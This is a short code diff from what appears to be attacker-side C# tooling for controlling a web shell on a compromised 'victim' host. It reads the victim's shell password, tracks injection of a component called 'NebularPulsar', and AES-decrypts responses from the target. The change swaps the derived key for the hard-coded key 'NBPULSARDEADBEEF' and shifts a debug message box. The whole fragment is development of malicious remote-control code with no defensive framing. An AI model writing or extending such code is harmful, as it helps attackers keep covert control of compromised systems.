@@ -797,7 +797,8 @@ namespace Alien
                 {
                     string szKey = m_victim.ShellPassword;
                     string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
-                    //szHashKey = "NBPULSARDEADBEEF";
+                    szHashKey = "NBPULSARDEADBEEF";
+                    //MessageBox.Show(szHashKey);
                     byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
 
                     if (!m_bInjectedNebularPulsar)
@@ -862,8 +863,6 @@ namespace Alien
                             byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);
 
                             string szResp = Encoding.UTF8.GetString(abResp);
-
-                            //MessageBox.Show(szResp);
 
                             return szResp;
                         }
